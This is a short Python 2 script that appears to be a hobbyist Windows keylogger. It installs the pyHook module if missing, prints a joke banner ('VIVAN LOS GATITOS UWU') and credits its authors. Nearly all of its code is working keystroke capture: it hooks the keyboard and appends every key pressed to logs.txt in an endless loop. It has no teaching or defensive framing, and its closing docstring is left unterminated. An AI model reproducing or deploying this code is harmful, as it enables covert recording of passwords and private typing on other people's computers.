import sys
import time
import os
try:
 import pyHook
except:
  print(" Instalando Modulo pyHook ") 
  if os.name=='nt':
    try:
      os.system('C:\Python27\Scripts\pip2.exe install pyHook')
    except:
      print ("Install Python-Pip Sir") 
      raw_input('')
  else:
    os.system('pip2 install pyhook')
msg00 ="VIVAN LOS GATITOS UWU"" - BOG"
for i in msg00:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)

import pyHook,pythoncom
 
 
def savefile(name,text):
 file = open(name,"a")
 file.write(text+"\n")
 file.close()
 
def toma(frase):
 savefile("logs.txt",frase.Key)
 
def capturar():
 nave = pyHook.HookManager()
 nave.KeyDown = toma
 nave.HookKeyboard()
 pythoncom.PumpMessages()
 
while 1:
 capturar()

"""""
EMMANUEL MILOS
EMILIO BARROSO
BOG INC 2k18-2k20
""""
